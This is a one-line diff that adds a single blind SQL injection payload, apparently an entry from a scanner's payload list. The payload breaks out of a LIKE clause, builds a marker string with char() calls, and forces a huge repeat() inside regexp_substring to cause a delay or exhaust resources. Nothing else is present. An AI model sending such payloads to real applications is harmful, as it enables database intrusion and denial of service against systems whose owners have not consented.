@@ -1,0 +1,1 @@
+1%') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('%'='
